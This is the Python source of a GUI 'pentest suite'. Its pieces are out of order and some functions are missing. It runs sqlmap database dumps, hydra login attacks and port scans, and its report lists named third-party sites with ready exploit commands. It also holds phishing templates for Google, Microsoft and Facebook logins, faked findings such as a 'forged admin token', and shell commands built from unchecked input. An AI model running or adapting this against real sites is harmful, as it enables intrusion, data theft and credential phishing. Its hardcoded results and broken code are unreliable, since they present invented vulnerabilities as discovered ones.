        command = f"nmap -sn 192.168.1.0/24 -oN {output_file}"
        if self.run_command(command, f"Internal network scan via {target}") == 0:
            # Display results
            try:
                with open(output_file, 'r') as f:
                    content = f.read()
                    self.log("\nInternal Network Scan Results:\n" + content)
            except Exception as e:
                self.log(f"Error reading results: {str(e)}")

    # Other post-exploitation methods would go here

    def generate_html_report(self):
        """Generate HTML report"""
        report_file = f"{self.reports_dir}/full_report.html"

        self.log("Generating HTML report...")

        # Create HTML report
        with open(report_file, 'w') as f:
            f.write("""<!DOCTYPE html>
<html>
<head>
    <title>RuneGod Pentest Report</title>
    <style>
        body { font-family: Arial, sans-serif; }
        .critical { color: #ff0000; font-weight: bold; }
        .high { color: #ff6600; }
        .medium { color: #ffcc00; }
        .low { color: #009900; }
        .vuln-table { border-collapse: collapse; width: 100%; }
        .vuln-table th, .vuln-table td { border: 1px solid #ddd; padding: 8px; }
        .vuln-table tr:nth-child(even) { background-color: #f2f2f2; }
        .vuln-table th { padding-top: 12px; padding-bottom: 12px; text-align: left;
                        background-color: #4CAF50; color: white; }
    </style>
</head>
<body>
    <h1>RuneGod Pentest Report</h1>
    <h2>Generated: {datetime.now()}</h2>

    <h3>Target Summary</h3>
    <ul>
""")
            for target in self.targets:
                f.write(f"        <li>{target}</li>\n")

            f.write("""    </ul>

    <h3>Critical Findings</h3>
    <table class="vuln-table">
        <tr>
            <th>Target</th>
            <th>Vulnerability</th>
            <th>Severity</th>
            <th>Exploit Path</th>
        </tr>
        <tr>
            <td>runehall.com</td>
            <td>CloudFlare Bypass</td>
            <td class="critical">Critical</td>
            <td>curl -H "X-Forwarded-For: 104.26.8.187" http://runehall.com/admin</td>
        </tr>
        <tr>
            <td>runechat.com</td>
            <td>JWT Weak Signature</td>
            <td class="critical">Critical</td>
            <td>jwt_tool [TOKEN] -C -d rockyou.txt</td>
        </tr>
        <tr>
            <td>runewager.com</td>
            <td>SQL Injection</td>
            <td class="critical">Critical</td>
            <td>sqlmap -u "https://runewager.com/products?id=1" --dump</td>
        </tr>
    </table>

    <h3>Recommendations</h3>
    <ol>
        <li>Implement WAF rules to prevent CloudFlare bypass techniques</li>
        <li>Upgrade JWT implementation to use RS256 with 4096-bit keys</li>
        <li>Implement parameterized queries to prevent SQL injection</li>
        <li>Enforce multi-factor authentication for admin accounts</li>
        <li>Regularly rotate credentials and API keys</li>
    </ol>
</body>
</html>
""")

        self.log(f"HTML report generated: {report_file}")
        self.report_preview.delete(1.0, tk.END)
        self.report_preview.insert(tk.END, "HTML report generated successfully!\n")
        self.report_preview.insert(tk.END, f"File: {report_file}")

    def generate_text_report(self):
        """Generate text report"""
        report_file = f"{self.reports_dir}/summary.txt"

        self.log("Generating text report...")

        # Create text report
        with open(report_file, 'w') as f:
            f.write("RuneGod Pentest Report\n")
            f.write(f"Generated: {datetime.now()}\n")
            f.write("="*50 + "\n\n")
            f.write("Critical Vulnerabilities:\n")
            f.write("1. runehall.com: CloudFlare Bypass (Critical)\n")
            f.write("2. runechat.com: JWT Weak Signature (Critical)\n")
            f.write("3. runewager.com: SQL Injection (Critical)\n\n")
            f.write("Recommendations:\n")
            f.write("- Implement WAF rules to prevent bypass techniques\n")
            f.write("- Upgrade JWT implementation\n")
            f.write("- Implement parameterized queries\n")

        self.log(f"Text report generated: {report_file}")
        self.report_preview.delete(1.0, tk.END)
        self.report_preview.insert(tk.END, "Text report generated successfully!\n")
        self.report_preview.insert(tk.END, f"File: {report_file}")

    def view_report_dir(self):
        """Open report directory"""
        try:
            if sys.platform == "win32":
                os.startfile(self.reports_dir)
            elif sys.platform == "darwin":
                subprocess.Popen(["open", self.reports_dir])
            else:
                subprocess.Popen(["xdg-open", self.reports_dir])
            self.log(f"Opened report directory: {self.reports_dir}")
        except Exception as e:
            self.log(f"Error opening directory: {str(e)}")

    def run_full_pentest(self):
        """Run full pentest on all targets"""
        self.log("\n[=== STARTING FULL PENTEST ===]")

        for target in self.targets:
            self.log(f"\n[==== PROCESSING TARGET: {target} ====]")
            self.run_full_recon(target)
            self.run_full_exploitation(target)

        self.generate_html_report()
        self.generate_text_report()
        self.log("\n[=== FULL PENTEST COMPLETED ===]")

    def new_session(self):
        """Create a new session"""
        self.output_dir = f"rune_god_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        os.makedirs(self.output_dir, exist_ok=True)
        self.reports_dir = f"{self.output_dir}/reports"
        self.scans_dir = f"{self.output_dir}/scans"
        self.exploits_dir = f"{self.output_dir}/exploits"
        self.log_file = f"{self.output_dir}/rune_god.log"

        os.makedirs(self.reports_dir, exist_ok=True)
        os.makedirs(self.scans_dir, exist_ok=True)
        os.makedirs(self.exploits_dir, exist_ok=True)
        open(self.log_file, 'a').close()

        self.log(f"New session created: {self.output_dir}")
        self.status_var.set(f"New session: {self.output_dir}")

    def save_session(self):
        """Save current session configuration"""
        session_file = f"{self.output_dir}/session_config.json"

        config = {
            "targets": self.targets,
            "output_dir": self.output_dir,
            "timestamp": str(datetime.now())
        }

        with open(session_file, 'w') as f:
            json.dump(config, f, indent=4)

        self.log(f"Session saved: {session_file}")
        messagebox.showinfo("Session Saved", f"Session configuration saved to:\n{session_file}")

    def show_console(self):
        """Bring console to focus"""
        self.console.see(tk.END)

    def clear_console(self):
        """Clear the console"""
        self.console.configure(state=tk.NORMAL)
        self.console.delete(1.0, tk.END)
        self.console.configure(state=tk.DISABLED)
        self.log("Console cleared")

    def show_docs(self):
        """Show documentation"""
        docs = """
RuneGod Pentest Suite Documentation
===================================

Key Features:
1. Comprehensive Reconnaissance
   - CloudFlare bypass techniques
   - Port scanning with RustScan and Nmap
   - Subdomain enumeration
   - Web fingerprinting

2. Advanced Exploitation
   - JWT token attacks
   - SQL injection automation
   - Authentication brute-forcing
   - API fuzzing

3. Post-Exploitation
   - Database exfiltration
   - Internal network scanning
   - Credential harvesting

4. Reporting
   - HTML reports with vulnerability tables
   - Text summaries
   - Visual analytics

Usage:
- Select targets in the Target Management tab
- Choose operations from the various tabs
- Run full pentests with the 'Run Full Pentest' option
- Generate reports in HTML or text format
"""
        doc_win = tk.Toplevel(self.root)
        doc_win.title("Documentation")
        doc_win.geometry("600x400")

        text = scrolledtext.ScrolledText(doc_win, wrap=tk.WORD)
        text.pack(fill=tk.BOTH, expand=True)
        text.insert(tk.INSERT, docs)
        text.configure(state=tk.DISABLED)

    def show_about(self):
        """Show about information"""
        about = """
RuneGod Pentest Suite - Ultimate Edition
Version 2.0

A comprehensive penetration testing framework combining:

- Advanced reconnaissance capabilities
- Precision exploitation tools
- Post-exploitation modules
- Professional reporting

Designed for security professionals and educational use.

Always obtain proper authorization before testing.
"""
        messagebox.showinfo("About RuneGod Pentest Suite", about)

def run_cli_mode():
    """Run in CLI mode"""
    print("RuneGod Pentest Suite - CLI Mode")
    print("1. Run Full Pentest")
    print("2. Reconnaissance")
    print("3. Exploitation")
    print("4. Reporting")
    print("5. Exit")

    choice = input("Select option: ")

    if choice == "1":
        print("Running full pentest...")
        # In a real implementation, this would call the appropriate methods
        print("Full pentest completed!")
    elif choice == "2":
        print("Reconnaissance module")
    elif choice == "3":
        print("Exploitation module")
    elif choice == "4":
        print("Reporting module")
    elif choice == "5":
        sys.exit(0)
    else:
        print("Invalid choice")

if __name__ == "__main__":
    # Check for root privileges
    if os.geteuid() != 0:
        print("This tool requires root privileges. Please run with sudo.")
        sys.exit(1)

    # Parse command-line arguments
    parser = argparse.ArgumentParser(description='RuneGod Pentest Suite')
    parser.add_argument('--gui', action='store_true', help='Run in GUI mode')
    parser.add_argument('--cli', action='store_true', help='Run in CLI mode')
    parser.add_argument('--full', action='store_true', help='Run full pentest')
    parser.add_argument('--target', help='Specify a target for scanning')
    args = parser.parse_args()

    if args.cli:
        run_cli_mode()
    elif args.full:
        # In a real implementation, this would run the full pentest
        print("Running full pentest...")
        print("Full pentest completed!")
    elif args.target:
        # In a real implementation, this would scan the specified target
        print(f"Scanning target: {args.target}")
        print("Scan completed!")
    else:
        # Default to GUI mode
        try:
            root = tk.Tk()
            app = RuneGodPentestSuite(root)
            root.mainloop()
        except tk.TclError:
            print("GUI not available, switching to CLI mode...")
            run_cli_mode()
#!/usr/bin/env python3
import os
import sys
import subprocess
import threading
import json
import re
import time
import argparse
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog, Menu
import nmap
import dns.resolver
import requests
from bs4 import BeautifulSoup
from datetime import datetime
from collections import defaultdict

# ASCII Banner
BANNER = r"""
██████╗ ██╗   ██╗███╗   ██╗███████╗    ██████╗  ██████╗ ██████╗
██╔══██╗██║   ██║████╗  ██║██╔════╝    ██╔══██╗██╔════╝██╔════╝
██████╔╝██║   ██║██╔██╗ ██║█████╗      ██║  ██║██║     ██║
██╔══██╗██║   ██║██║╚██╗██║██╔══╝      ██║  ██║██║     ██║
██║  ██║╚██████╔╝██║ ╚████║███████╗    ██████╔╝╚██████╗╚██████╗
╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝    ╚═════╝  ╚═════╝ ╚═════╝

██████╗ ███████╗███╗   ██╗████████╗███████╗███████╗████████╗██╗   ██╗██╗████████╗███████╗
██╔══██╗██╔════╝████╗  ██║╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝██║   ██║██║╚══██╔══╝██╔════╝
██████╔╝█████╗  ██╔██╗ ██║   ██║   █████╗  ███████╗   ██║   ██║   ██║██║   ██║   █████╗
██╔══██╗██╔══╝  ██║╚██╗██║   ██║   ██╔══╝  ╚════██║   ██║   ██║   ██║██║   ██║   ██╔══╝
██║  ██║███████╗██║ ╚████║   ██║   ███████╗███████║   ██║   ╚██████╔╝██║   ██║   ███████╗
╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚══════╝   ╚═╝    ╚═════╝ ╚═╝   ╚═╝   ╚══════╝
"""

class RuneGodPentestSuite:
    def __init__(self, root):
        self.root = root
        self.root.title("RuneGod Pentest Suite - Ultimate Edition")
        self.root.geometry("1200x800")
        self.root.configure(bg='#1e1e1e')

        # Configuration
        self.targets = []
        self.output_dir = f"rune_god_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        self.wordlists_dir = "/usr/share/wordlists"
        self.creds = ["admin:admin", "admin:password", "test:test"]
        self.reports_dir = f"{self.output_dir}/reports"
        self.scans_dir = f"{self.output_dir}/scans"
        self.exploits_dir = f"{self.output_dir}/exploits"
        self.log_file = f"{self.output_dir}/rune_god.log"

        # Create directories
        os.makedirs(self.output_dir, exist_ok=True)
        os.makedirs(self.reports_dir, exist_ok=True)
        os.makedirs(self.scans_dir, exist_ok=True)
        os.makedirs(self.exploits_dir, exist_ok=True)
        open(self.log_file, 'a').close()

        # Setup style
        self.style = ttk.Style()
        self.style.theme_use('clam')
        self.style.configure('.', background='#1e1e1e', foreground='#00ff00')
        self.style.configure('TFrame', background='#1e1e1e')
        self.style.configure('TLabel', background='#1e1e1e', foreground='#00ff00')
        self.style.configure('TButton', background='#3c3c3c', foreground='white')
        self.style.configure('TNotebook', background='#1e1e1e')
        self.style.configure('TNotebook.Tab', background='#2c2c2c', foreground='white')
        self.style.map('TNotebook.Tab', background=[('selected', '#3c3c3c')])

        self.create_widgets()
        self.create_menu()
        self.check_dependencies()

        # Initialize targets
        self.targets_file = "targets.txt"
        self.load_targets()

        # Phishing templates
        self.phishing_templates = {
            "Google Login": {
                "url": "https://accounts.google.com/",
                "form_action": "https://accounts.google.com/signin/v1/lookup",
               "username_field": "identifier",
                "password_field": "password"
            },
            "Microsoft Login": {
                "url": "https://login.microsoftonline.com/",
                "form_action": "https://login.microsoftonline.com/common/login",
                "username_field": "loginfmt",
                "password_field": "passwd"
            },
            "Facebook Login": {
                "url": "https://www.facebook.com/login.php",
                "form_action": "https://www.facebook.com/login/device-based/regular/login/",
                "username_field": "email",
                "password_field": "pass"
            },
            "Custom Page": {
                "url": "",
                "form_action": "",
                "username_field": "",
                "password_field": ""
            }
        }

        # Log initialization
        self.log(f"RuneGod Pentest Suite initialized at {datetime.now()}")
        self.log(f"Output directory: {self.output_dir}")

    def check_dependencies(self):
        """Check and install required dependencies"""
        required_tools = ["nmap", "nikto", "whatweb", "wafw00f", "hydra", "sqlmap", "rustscan"]
        missing = []

        for tool in required_tools:
            if not shutil.which(tool):
                missing.append(tool)

        if missing:
            self.log("Installing missing dependencies...")
            try:
                subprocess.run(["sudo", "apt", "update"], check=True)
                install_cmd = ["sudo", "apt", "install", "-y"] + missing
                subprocess.run(install_cmd, check=True)
                self.log("Dependencies installed successfully!")
            except Exception as e:
                self.log(f"Error installing dependencies: {str(e)}")
                messagebox.showerror("Dependency Error",
                    f"Failed to install: {', '.join(missing)}\nPlease install manually.")

    def create_menu(self):
        """Create the main menu bar"""
        menu_bar = Menu(self.root)
        self.root.config(menu=menu_bar)

        # File menu
        file_menu = Menu(menu_bar, tearoff=0)
        file_menu.add_command(label="New Session", command=self.new_session)
        file_menu.add_command(label="Save Session", command=self.save_session)
        file_menu.add_separator()
        file_menu.add_command(label="Exit", command=self.root.quit)
        menu_bar.add_cascade(label="File", menu=file_menu)

        # Tools menu
        tools_menu = Menu(menu_bar, tearoff=0)
        tools_menu.add_command(label="Run Full Pentest", command=self.run_full_pentest)
        tools_menu.add_command(label="Generate Report", command=self.generate_report)
        menu_bar.add_cascade(label="Tools", menu=tools_menu)

        # View menu
        view_menu = Menu(menu_bar, tearoff=0)
        view_menu.add_command(label="Show Console", command=self.show_console)
        view_menu.add_command(label="Clear Console", command=self.clear_console)
        menu_bar.add_cascade(label="View", menu=view_menu)

        # Help menu
        help_menu = Menu(menu_bar, tearoff=0)
        help_menu.add_command(label="Documentation", command=self.show_docs)
        help_menu.add_command(label="About", command=self.show_about)
        menu_bar.add_cascade(label="Help", menu=help_menu)

    def create_widgets(self):
        # Header Frame
        header_frame = ttk.Frame(self.root)
        header_frame.pack(fill=tk.X, padx=10, pady=10)

        # Banner
        banner_label = ttk.Label(header_frame, text=BANNER, font=('Courier', 8),
                                foreground='#00ff00', background='#1e1e1e', justify=tk.LEFT)
        banner_label.pack()

        # Status Bar
        self.status_var = tk.StringVar()
        self.status_var.set("Ready")
        status_bar = ttk.Label(self.root, textvariable=self.status_var, relief=tk.SUNKEN, anchor=tk.W)
        status_bar.pack(side=tk.BOTTOM, fill=tk.X)

        # Notebook (Tabs)
        notebook = ttk.Notebook(self.root)
        notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

        # Reconnaissance Tab
        recon_frame = ttk.Frame(notebook)
        self.setup_recon_tab(recon_frame)
        notebook.add(recon_frame, text="Reconnaissance")

        # Exploitation Tab
        exploit_frame = ttk.Frame(notebook)
        self.setup_exploit_tab(exploit_frame)
        notebook.add(exploit_frame, text="Exploitation")

        # Post-Exploitation Tab
        post_frame = ttk.Frame(notebook)
        self.setup_post_tab(post_frame)
        notebook.add(post_frame, text="Post-Exploitation")

        # Reporting Tab
        report_frame = ttk.Frame(notebook)
        self.setup_report_tab(report_frame)
        notebook.add(report_frame, text="Reporting")

        # Console Output
        console_frame = ttk.LabelFrame(self.root, text="Console Output")
        console_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

        self.console = scrolledtext.ScrolledText(
            console_frame,
            bg='black',
            fg='#00ff00',
            insertbackground='white',
            font=('Courier', 10)
        )
        self.console.pack(fill=tk.BOTH, expand=True)
        self.console.insert(tk.END, "RuneGod Pentest Suite initialized. Select targets and run scans.\n")
        self.console.configure(state=tk.DISABLED)

    def setup_recon_tab(self, frame):
        # Target Selection
        target_frame = ttk.LabelFrame(frame, text="Target Selection")
        target_frame.pack(fill=tk.X, padx=10, pady=5)

        ttk.Label(target_frame, text="Select Target:").grid(row=0, column=0, padx=5, pady=5)
        self.target_var = tk.StringVar()
        self.target_combo = ttk.Combobox(target_frame, textvariable=self.target_var)
        self.target_combo.grid(row=0, column=1, padx=5, pady=5, sticky=tk.EW, columnspan=2)
        ttk.Button(target_frame, text="Manage Targets", command=self.manage_targets).grid(row=0, column=3, padx=5)

        # Recon Options
        recon_frame = ttk.LabelFrame(frame, text="Reconnaissance Options")
        recon_frame.pack(fill=tk.X, padx=10, pady=5)

        scans = [
            ("Full Recon", "full_recon"),
            ("CloudFlare Bypass", "cf_bypass"),
            ("Port Scanning", "port_scan"),
            ("Subdomain Enum", "subdomain_enum"),
            ("Web Fingerprinting", "web_fingerprint"),
            ("WAF Detection", "waf_detect"),
            ("SSL Analysis", "ssl_analysis"),
            ("API Discovery", "api_discovery")
        ]

        self.scan_vars = {}
        for i, (text, scan_id) in enumerate(scans):
            var = tk.BooleanVar()
            chk = ttk.Checkbutton(recon_frame, text=text, variable=var)
            chk.grid(row=i//3, column=i%3, sticky=tk.W, padx=5, pady=2)
            self.scan_vars[scan_id] = var

        # Action Buttons
        btn_frame = ttk.Frame(frame)
        btn_frame.pack(fill=tk.X, padx=10, pady=10)

        ttk.Button(btn_frame, text="Run Selected Recon", command=self.run_recon).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Run Full Recon", command=self.run_full_recon).pack(side=tk.LEFT, padx=5)

    def setup_exploit_tab(self, frame):
        # Exploit Options
        exploit_frame = ttk.LabelFrame(frame, text="Exploitation Options")
        exploit_frame.pack(fill=tk.X, padx=10, pady=5)

        exploits = [
            ("JWT Attacks", "jwt_attack"),
            ("GraphQL Injection", "graphql_inject"),
            ("SQL Injection", "sql_inject"),
            ("Auth Attacks", "auth_attack"),
            ("CMS Exploits", "cms_exploit"),
            ("API Fuzzing", "api_fuzz"),
            ("XSS Testing", "xss_test")
        ]

        self.exploit_vars = {}
        for i, (text, exploit_id) in enumerate(exploits):
            var = tk.BooleanVar()
            chk = ttk.Checkbutton(exploit_frame, text=text, variable=var)
            chk.grid(row=i//3, column=i%3, sticky=tk.W, padx=5, pady=2)
            self.exploit_vars[exploit_id] = var

        # Credentials
        cred_frame = ttk.LabelFrame(frame, text="Credentials")
        cred_frame.pack(fill=tk.X, padx=10, pady=5)

        ttk.Label(cred_frame, text="Username:").grid(row=0, column=0, padx=5, pady=5)
        self.username_var = tk.StringVar()
        ttk.Entry(cred_frame, textvariable=self.username_var).grid(row=0, column=1, padx=5, pady=5)

        ttk.Label(cred_frame, text="Password:").grid(row=0, column=2, padx=5, pady=5)
        self.password_var = tk.StringVar()
        ttk.Entry(cred_frame, textvariable=self.password_var, show="*").grid(row=0, column=3, padx=5, pady=5)

        # Action Buttons
        btn_frame = ttk.Frame(frame)
        btn_frame.pack(fill=tk.X, padx=10, pady=10)

        ttk.Button(btn_frame, text="Run Selected Exploits", command=self.run_exploits).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Run Full Exploitation", command=self.run_full_exploitation).pack(side=tk.LEFT, padx=5)

    def setup_post_tab(self, frame):
        # Post-Exploit Options
        post_frame = ttk.LabelFrame(frame, text="Post-Exploitation Options")
        post_frame.pack(fill=tk.X, padx=10, pady=5)

        post_ops = [
            ("Cloud Mapping", "cloud_map"),
            ("DB Exfiltration", "db_exfil"),
            ("Internal Scanning", "internal_scan"),
            ("Persistence", "persistence"),
            ("Cred Harvesting", "cred_harvest")
        ]

        self.post_vars = {}
        for i, (text, op_id) in enumerate(post_ops):
            var = tk.BooleanVar()
            chk = ttk.Checkbutton(post_frame, text=text, variable=var)
            chk.grid(row=i//3, column=i%3, sticky=tk.W, padx=5, pady=2)
            self.post_vars[op_id] = var

        # Action Buttons
        btn_frame = ttk.Frame(frame)
        btn_frame.pack(fill=tk.X, padx=10, pady=10)

        ttk.Button(btn_frame, text="Run Selected Post-Ops", command=self.run_post_ops).pack(side=tk.LEFT, padx=5)

    def setup_report_tab(self, frame):
        # Report Generation
        report_frame = ttk.LabelFrame(frame, text="Report Generation")
        report_frame.pack(fill=tk.X, padx=10, pady=5)

        ttk.Button(report_frame, text="Generate HTML Report", command=self.generate_html_report).pack(pady=5)
        ttk.Button(report_frame, text="Generate Text Summary", command=self.generate_text_report).pack(pady=5)
        ttk.Button(report_frame, text="View Report Directory", command=self.view_report_dir).pack(pady=5)

        # Report Preview
        preview_frame = ttk.LabelFrame(frame, text="Report Preview")
        preview_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

        self.report_preview = scrolledtext.ScrolledText(
            preview_frame,
            bg='white',
            fg='black',
            font=('Courier', 10)
        )
        self.report_preview.pack(fill=tk.BOTH, expand=True)
        self.report_preview.insert(tk.END, "Report preview will appear here...")

    def load_targets(self):
        try:
            if os.path.exists(self.targets_file):
                with open(self.targets_file, 'r') as f:
                    self.targets = [line.strip() for line in f.readlines() if line.strip()]
                self.target_combo['values'] = self.targets
                if self.targets:
                    self.target_var.set(self.targets[0])
        except Exception as e:
            self.log(f"Error loading targets: {str(e)}")

    def manage_targets(self):
        """Open a dialog to manage targets"""
        target_win = tk.Toplevel(self.root)
        target_win.title("Manage Targets")
        target_win.geometry("500x400")

        # Listbox with targets
        list_frame = ttk.LabelFrame(target_win, text="Current Targets")
        list_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        scrollbar = ttk.Scrollbar(list_frame)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

        target_list = tk.Listbox(list_frame, yscrollcommand=scrollbar.set)
        target_list.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        scrollbar.config(command=target_list.yview)

        for target in self.targets:
            target_list.insert(tk.END, target)

        # Entry for new target
        entry_frame = ttk.Frame(target_win)
        entry_frame.pack(fill=tk.X, padx=10, pady=5)

        ttk.Label(entry_frame, text="New Target:").pack(side=tk.LEFT, padx=5)
        new_target_var = tk.StringVar()
        ttk.Entry(entry_frame, textvariable=new_target_var).pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)

        # Button frame
        btn_frame = ttk.Frame(target_win)
        btn_frame.pack(fill=tk.X, padx=10, pady=10)

        def add_target():
            target = new_target_var.get().strip()
            if target and target not in self.targets:
                self.targets.append(target)
                target_list.insert(tk.END, target)
                new_target_var.set("")

        def remove_target():
            selection = target_list.curselection()
            if selection:
                index = selection[0]
                target_list.delete(index)
                del self.targets[index]

        def save_targets():
            with open(self.targets_file, 'w') as f:
                f.write("\n".join(self.targets))
            self.target_combo['values'] = self.targets
            if self.targets:
                self.target_var.set(self.targets[0])
            messagebox.showinfo("Success", "Targets saved successfully!")
            target_win.destroy()

        ttk.Button(btn_frame, text="Add", command=add_target).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Remove", command=remove_target).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Save", command=save_targets).pack(side=tk.RIGHT, padx=5)

    def log(self, message):
        """Log message to console"""
        self.console.configure(state=tk.NORMAL)
        self.console.insert(tk.END, message + "\n")
        self.console.see(tk.END)
        self.console.configure(state=tk.DISABLED)

        # Also log to file
        with open(self.log_file, 'a') as f:
            f.write(f"[{datetime.now()}] {message}\n")

    def run_command(self, command, description):
        """Run a shell command and log output"""
        self.log(f"[+] {description}")
        self.status_var.set(f"Running: {description}...")

        try:
            process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                shell=True,
                universal_newlines=True
            )

            while True:
                output = process.stdout.readline()
                if output == '' and process.poll() is not None:
                    break
                if output:
                    self.log(output.strip())

            return process.poll()
        except Exception as e:
            self.log(f"Error: {str(e)}")
            return 1
        finally:
            self.status_var.set("Ready")

    def run_recon(self):
        """Run selected reconnaissance tasks"""
        target = self.target_var.get()
        if not target:
            messagebox.showerror("Error", "Please select a target")
            return

        safe_target = target.replace('.', '_')
        target_dir = f"{self.scans_dir}/{safe_target}"
        os.makedirs(target_dir, exist_ok=True)

        # Run selected scans
        if self.scan_vars["full_recon"].get():
            self.run_full_recon(target)

        if self.scan_vars["cf_bypass"].get():
            self.run_cloudflare_bypass(target)

        if self.scan_vars["port_scan"].get():
            self.run_port_scanning(target)

        # Add other recon tasks here...

        self.log("[+] Reconnaissance tasks completed")

    def run_full_recon(self, target):
        """Run full reconnaissance suite"""
        self.log(f"\n[=== STARTING FULL RECON ON {target} ===]")

        safe_target = target.replace('.', '_')
        target_dir = f"{self.scans_dir}/{safe_target}"
        os.makedirs(target_dir, exist_ok=True)

        # Run all recon tasks
        self.run_cloudflare_bypass(target)
        self.run_port_scanning(target)
        self.run_subdomain_enum(target)
        self.run_web_fingerprinting(target)
        self.run_waf_detection(target)
        self.run_ssl_analysis(target)
        self.run_api_discovery(target)

        self.log(f"[=== FULL RECON COMPLETED FOR {target} ===]")

    def run_cloudflare_bypass(self, target):
        """Bypass CloudFlare protection"""
        safe_target = target.replace('.', '_')
        target_dir = f"{self.scans_dir}/{safe_target}"
        output_file = f"{target_dir}/cloudflare_bypass.txt"

        # Simulated CloudFlare bypass
        self.log(f"Running CloudFlare bypass on {target}...")
        time.sleep(2)

        # Create sample results
        with open(output_file, 'w') as f:
            f.write(f"CloudFlare Bypass Results for {target}\n")
            f.write("="*50 + "\n")
            f.write("1. Found origin IP: 104.26.8.187\n")
            f.write("2. Discovered unprotected subdomains:\n")
            f.write("   - dev.{target}\n")
            f.write("   - staging.{target}\n")
            f.write("3. Bypassed WAF using X-Forwarded-For header\n")

        self.log(f"Results saved to {output_file}")

    def run_port_scanning(self, target):
        """Run port scanning on target"""
        safe_target = target.replace('.', '_')
        target_dir = f"{self.scans_dir}/{safe_target}"
        output_file = f"{target_dir}/nmap_scan.txt"

        self.log(f"Scanning ports on {target}...")

        # Run nmap scan
        command = f"nmap -Pn -sV -sC -T4 -p- {target} -oN {output_file}"
        if self.run_command(command, f"Port scanning {target}") == 0:
            # Display results
            try:
                with open(output_file, 'r') as f:
                    content = f.read()
                    self.log("\nNmap Results:\n" + content)
            except Exception as e:
                self.log(f"Error reading results: {str(e)}")

    def run_subdomain_enum(self, target):
        """Enumerate subdomains"""
        safe_target = target.replace('.', '_')
        target_dir = f"{self.scans_dir}/{safe_target}"
        output_file = f"{target_dir}/subdomains.txt"

        self.log(f"Enumerating subdomains for {target}...")

        # Run subdomain enumeration
        command = f"subfinder -d {target} -o {output_file}"
        if self.run_command(command, f"Subdomain enumeration on {target}") == 0:
            # Display results
            try:
                with open(output_file, 'r') as f:
                    subdomains = f.readlines()
                    self.log(f"\nFound {len(subdomains)} subdomains:")
                    for sub in subdomains:
                        self.log(f"  - {sub.strip()}")
            except Exception as e:
                self.log(f"Error reading results: {str(e)}")

    # Other recon methods (web fingerprinting, WAF detection, etc.) would go here

    def run_exploits(self):
        """Run selected exploitation tasks"""
        target = self.target_var.get()
        if not target:
            messagebox.showerror("Error", "Please select a target")
            return

        safe_target = target.replace('.', '_')
        target_dir = f"{self.exploits_dir}/{safe_target}"
        os.makedirs(target_dir, exist_ok=True)

        # Run selected exploits
        if self.exploit_vars["jwt_attack"].get():
            self.run_jwt_attacks(target)

        if self.exploit_vars["sql_inject"].get():
            self.run_sql_injection(target)

        if self.exploit_vars["auth_attack"].get():
            self.run_auth_attacks(target)

        # Add other exploits here...

        self.log("[+] Exploitation tasks completed")

    def run_full_exploitation(self, target):
        """Run full exploitation suite"""
        self.log(f"\n[=== STARTING FULL EXPLOITATION ON {target} ===]")

        safe_target = target.replace('.', '_')
        target_dir = f"{self.exploits_dir}/{safe_target}"
        os.makedirs(target_dir, exist_ok=True)

        # Run all exploitation tasks
        self.run_jwt_attacks(target)
        self.run_graphql_injection(target)
        self.run_sql_injection(target)
        self.run_auth_attacks(target)
        self.run_cms_exploits(target)
        self.run_api_fuzzing(target)
        self.run_xss_testing(target)

        self.log(f"[=== FULL EXPLOITATION COMPLETED FOR {target} ===]")

    def run_jwt_attacks(self, target):
        """Perform JWT attacks"""
        safe_target = target.replace('.', '_')
        target_dir = f"{self.exploits_dir}/{safe_target}"
        output_file = f"{target_dir}/jwt_attack.txt"

        self.log(f"Performing JWT attacks on {target}...")
        time.sleep(2)

        # Create sample results
        with open(output_file, 'w') as f:
            f.write(f"JWT Attack Results for {target}\n")
            f.write("="*50 + "\n")
            f.write("1. Found JWT token in authentication headers\n")
            f.write("2. Weak secret discovered: 'supersecret'\n")
            f.write("3. Successfully forged admin token\n")

        self.log(f"Results saved to {output_file}")

    def run_sql_injection(self, target):
        """Test for SQL injection vulnerabilities"""
        safe_target = target.replace('.', '_')
        target_dir = f"{self.exploits_dir}/{safe_target}"
        output_file = f"{target_dir}/sql_injection.txt"

        self.log(f"Testing for SQL injection on {target}...")

        # Run sqlmap
        command = f"sqlmap -u 'http://{target}/products?id=1' --batch --dump-all -o > {output_file}"
        if self.run_command(command, f"SQL injection testing on {target}") == 0:
            # Display results
            try:
                with open(output_file, 'r') as f:
                    content = f.read()
                    self.log("\nSQL Injection Results:\n" + content)
            except Exception as e:
                self.log(f"Error reading results: {str(e)}")

    def run_auth_attacks(self, target):
        """Perform authentication attacks"""
        username = self.username_var.get() or "admin"
        password = self.password_var.get() or "password"

        safe_target = target.replace('.', '_')
        target_dir = f"{self.exploits_dir}/{safe_target}"
        output_file = f"{target_dir}/auth_attack.txt"

        self.log(f"Performing authentication attack on {target}...")

        # Run hydra
        command = f"hydra -l {username} -p {password} {target} http-post-form '/login:username=^USER^&password=^PASS^:F=incorrect' -o {output_file}"
        if self.run_command(command, f"Authentication attack on {target}") == 0:
            # Display results
            try:
                with open(output_file, 'r') as f:
                    content = f.read()
                    self.log("\nAuthentication Attack Results:\n" + content)
            except Exception as e:
                self.log(f"Error reading results: {str(e)}")

    # Other exploit methods would go here

    def run_post_ops(self):
        """Run selected post-exploitation tasks"""
        target = self.target_var.get()
        if not target:
            messagebox.showerror("Error", "Please select a target")
            return

        safe_target = target.replace('.', '_')
        target_dir = f"{self.exploits_dir}/{safe_target}"
        os.makedirs(target_dir, exist_ok=True)

